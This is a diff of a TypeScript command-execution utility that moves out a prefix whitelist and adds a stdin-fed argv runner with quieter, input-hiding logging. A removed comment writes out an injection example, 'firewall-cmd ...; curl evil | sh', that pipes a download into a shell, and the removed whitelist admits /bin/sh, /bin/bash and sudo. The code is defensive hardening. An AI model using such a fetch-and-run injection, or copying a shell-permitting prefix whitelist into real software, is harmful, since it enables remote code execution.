@@ -1,82 +1,29 @@
 // src/utils/exec.ts
 import { exec, execFile, ChildProcess } from 'child_process';
 import logger from './logger';
+import { isCommandAllowed } from './commandWhitelist';
 
 interface CommandResult {
   stdout: string;
   stderr: string;
   exitCode: number | null;
+  /** execute_argv*: the errno code (e.g. 'ENOENT') when the program could not be spawned at all. */
+  spawnError?: string;
 }
 
 interface ExecArgvOptions {
   timeoutMs?: number;
+  /**
+   * Logs the attempt at debug instead of info. For routine read-only commands run on every
+   * update tick, whose info lines would otherwise fill the journal (root disk full, 2026-11-03).
+   * Failures and timeouts are still logged at warn.
+   */
+  quiet?: boolean;
 }
 
 // How long a child that timed out gets to exit on the SIGTERM sent at its
 // timeout before it is sent SIGKILL.
 const FORCE_KILL_GRACE_MS = 5000;
-
-// Whitelist of allowed command prefixes for security
-// Only commands starting with these prefixes are allowed to execute
-const ALLOWED_COMMAND_PREFIXES = [
-  'sudo',
-  'firewall-cmd',
-  'virsh',
-  'systemctl',
-  'smartctl',
-  'nvidia-smi',
-  'sensors',
-  'ip ',
-  'bridge ',
-  'arp',
-  'getent ',
-  'dig ',
-  'ping ',
-  'cat ',
-  'grep ',
-  'tail ',
-  'apt ',
-  'apt-get ',
-  'hostapd',
-  'mosquitto_sub',
-  'docker ',
-  'winvm',
-  'ls ',
-  'stat ',
-  'df ',
-  'free',
-  'uptime',
-  'who',
-  'w ',
-  'journalctl',
-  '/bin/sh',
-  '/bin/bash',
-  'gpu-stats',
-  'upsc ',
-  'upscmd ',
-];
-
-/**
- * Validates if a command is allowed based on whitelist.
- *
- * SECURITY NOTE: this prefix whitelist is NOT the primary protection against
- * command injection. It only checks the *start* of the command string, so a
- * value like `firewall-cmd ...; curl evil | sh` still passes. Any command that
- * interpolates a value controlled by MQTT / an external user MUST use
- * `execute_argv` (which never spawns a shell) together with the strict field
- * validators in `./validators`. `execute_command` (shell) is reserved for
- * fixed literals that genuinely need a shell (pipes, redirections, env
- * assignments) and MUST NOT interpolate any externally-controlled value.
- *
- * @param command The command to validate
- * @returns true if command is allowed, false otherwise
- */
-function isCommandAllowed(command: string): boolean {
-  const trimmedCommand = command.trim();
-
-  // Check if command starts with any allowed prefix
-  return ALLOWED_COMMAND_PREFIXES.some(prefix => trimmedCommand.startsWith(prefix));
-}
 
 /**
  * Executes a shell command.
@@ -139,9 +86,26 @@ export function execute_command(command: string, _requiresApproval: boolean, tim
  * @param opts Optional settings (timeoutMs, default 60000).
  */
 export function execute_argv(file: string, args: string[], opts: ExecArgvOptions = {}): Promise<CommandResult> {
-  const timeoutMs = opts.timeoutMs ?? 60000;
+  return runFile(file, args, undefined, opts);
+}
 
-  logger.info(`Attempting to execute argv command: ${file} ${args.join(' ')}`);
+/**
+ * `execute_argv` with `input` written to the child's stdin (e.g. `nft -f -`). The input is
+ * never logged, so it may carry what argv must not.
+ */
+export function execute_argv_input(file: string, args: string[], input: string, opts: ExecArgvOptions = {}): Promise<CommandResult> {
+  return runFile(file, args, input, opts);
+}
+
+function runFile(file: string, args: string[], input: string | undefined, opts: ExecArgvOptions): Promise<CommandResult> {
+  const timeoutMs = opts.timeoutMs ?? 60000;
+  const label = `${file} ${args.join(' ')}`;
+  // A child fed input may echo it (`nft -f -` quotes the failing line on stderr), and execFile
+  // copies stderr into error.message: with input, outputs are logged by length only.
+  const shown = (text: string) => (input === undefined ? text : `<${text.length} chars>`);
+  const attempt = `Attempting to execute argv command: ${label}`;
+  if (opts.quiet) logger.debug(attempt);
+  else logger.info(attempt);
 
   return new Promise((resolve) => {
     const childProcess = execFile(file, args, {
@@ -153,19 +117,29 @@ export function execute_argv(file: string, args: string[], opts: ExecArgvOptions
       if (error) {
         const anyError = error as NodeJS.ErrnoException & { killed?: boolean; code?: number | string };
         if (anyError.killed) {
-          logger.warn(`Command "${file} ${args.join(' ')}" timed out after ${timeoutMs / 1000}s and was killed`);
+          logger.warn(`Command "${label}" timed out after ${timeoutMs / 1000}s and was killed`);
         } else {
-          logger.warn(`Error executing command "${file} ${args.join(' ')}": ${error.message}. Exit code: ${anyError.code}. Stderr: ${stderr}`);
+          const message = input === undefined ? `${error.message}. ` : '';
+          logger.warn(`Error executing command "${label}": ${message}Exit code: ${anyError.code}. Stderr: ${shown(stderr)}`);
         }
         // execFile reports the exit code in error.code (number). A string code
         // (e.g. 'ENOENT') means the program could not be spawned → treat as 1.
-        const exitCode = typeof anyError.code === 'number' ? anyError.code : 1;
-        resolve({ stdout, stderr, exitCode });
+        if (typeof anyError.code === 'string') {
+          resolve({ stdout, stderr, exitCode: 1, spawnError: anyError.code });
+          return;
+        }
+        resolve({ stdout, stderr, exitCode: typeof anyError.code === 'number' ? anyError.code : 1 });
         return;
       }
-      logger.debug(`Command "${file} ${args.join(' ')}" executed successfully. Stdout: ${stdout}`);
+      logger.debug(`Command "${label}" executed successfully. Stdout: ${shown(stdout)}`);
       resolve({ stdout, stderr, exitCode: 0 });
     });
+    // A child that exits before reading its whole input fails the write with EPIPE; its
+    // exit code, resolved above, is the outcome that matters.
+    if (input !== undefined) {
+      childProcess.stdin?.on('error', (err) => logger.debug(`stdin of "${label}" closed early: ${err.message}`));
+      childProcess.stdin?.end(input);
+    }
 
     armForceKill(childProcess, timeoutMs);
   });
